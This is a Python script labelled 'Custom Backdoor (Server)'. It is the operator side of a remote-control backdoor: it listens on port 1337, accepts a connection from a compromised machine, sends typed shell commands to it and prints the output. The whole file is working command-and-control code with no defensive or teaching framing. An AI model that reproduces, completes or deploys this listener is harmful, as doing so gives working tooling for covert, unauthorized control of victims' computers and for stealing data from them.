#!/usr/bin/env python

''' Custom Backdoor (Server) '''

import socket
import sys

HOST = '0.0.0.0'
PORT = 1337

try:
    print('[+] Server started')
    print('[+] Listening for connections...')
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    client, address = server.accept()
    print(f'[+] Connection estabilished: {address[0]}:{address[1]}')
    
    while True:
        command = input('pitch > ')

        if command in ('exit', 'quit'):
            client.send(b'exit')
            server.close()
            sys.exit()

        # Permanently shutdown backdoor
        if command in ('disable'):
            server.close()
            sys.exit()

        client.send(command.encode())
        response = client.recv(4096).decode()
        print(response)

except KeyboardInterrupt:
    client.send(b'exit')
    server.close()
    print('\n[!] User terminated')
    sys.exit()